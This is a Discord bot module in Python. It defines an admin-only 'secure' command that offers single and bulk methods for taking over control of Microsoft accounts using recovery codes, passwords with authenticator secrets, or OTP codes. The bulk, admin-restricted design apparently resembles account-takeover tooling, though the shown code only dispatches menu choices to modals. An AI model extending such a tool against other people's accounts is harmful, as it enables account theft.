from views.modals.recovery_secret_bulk import BulkAuthRecoveryModal
from views.modals.recovery_code_bulk import BulkRecoveryCodeModal
from views.modals.recovery_secret import recoveryAuthModal
from views.modals.recovery_code import recoveryCodeModal
from views.modals.otp_secure import OtpSecureModal
from views.modals.otp_bulk import OtpBulkModal
from discord.ext import commands
import discord
import json

bot_config = json.load(open("config/bot.json", "r"))
name = bot_config["enabled_commands"]["aliases"]["secure"]

class Dropdown(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(
                label="Recovery Code",
                description="Uses email + recovery code",
                value="rcvcode",
                emoji="📜",
            ),
            discord.SelectOption(
                label="Recovery Code Bulk",
                description="Bulk — email + recovery code",
                value="bulk_rcvcode",
                emoji="📜",
            ),
            discord.SelectOption(
                label="Password + Secret",
                description="Uses auth secret and password (msauth)",
                value="pwdsecret",
                emoji="🔑",
            ),
            discord.SelectOption(
                label="Password + Secret Bulk",
                description="Bulk — password + secret (msauth)",
                value="bulk_pwdsecret",
                emoji="🔑",
            ),
            discord.SelectOption(
                label="MS Auth OTP",
                description="Uses email + OTP code (no cookies)",
                value="otp",
                emoji="📧",
            ),
            discord.SelectOption(
                label="MS Auth OTP Bulk",
                description="Bulk — email + OTP code",
                value="bulk_otp",
                emoji="📧",
            ),
        ]
        super().__init__(
            placeholder="Select Securing Method",
            min_values=1,
            max_values=1,
            options=options,
            row=0
        )

    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]
        match selected:
            case "rcvcode":
                modal = recoveryCodeModal()
            case "bulk_rcvcode":
                modal = BulkRecoveryCodeModal()
            case "pwdsecret":
                modal = recoveryAuthModal()
            case "bulk_pwdsecret":
                modal = BulkAuthRecoveryModal()
            case "otp":
                modal = OtpSecureModal()
            case "bulk_otp":
                modal = OtpBulkModal()
            
        await interaction.response.send_modal(modal)


class secure(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @discord.slash_command(name=name, description="Automaticly secures your account")
    async def secure(self, ctx: discord.ApplicationContext):
        if ctx.author.id not in self.bot.admins:
            await ctx.respond("You do not have permission to execute this command!", ephemeral=True)
            return
    
       
        embed = discord.Embed(
            title="🔐 Select Securing Method",
            description="Choose how you want to authenticate:\n\n"
            "📜 **Recovery Code** — email + recovery code\n"
            "📜 **Recovery Code Bulk** — multi-account via email + recovery code\n"
            "🔑 **Password + Secret** — email + password + authenticator secret (msauth, cookie-based)\n"
            "🔑 **Password + Secret Bulk** — multi-account via password + secret\n"
            "📧 **MS Auth OTP** — email + Microsoft OTP code (no cookies needed)\n"
            "📧 **MS Auth OTP Bulk** — multi-account via email + OTP codes",
            color=0x5865F2,
        )

        view = discord.ui.View()
        view.add_item(Dropdown())

        await ctx.respond(
            embed = embed,
            view = view,
            ephemeral = True
        )

def setup(bot: commands.Bot) -> None:
    bot.add_cog(secure(bot))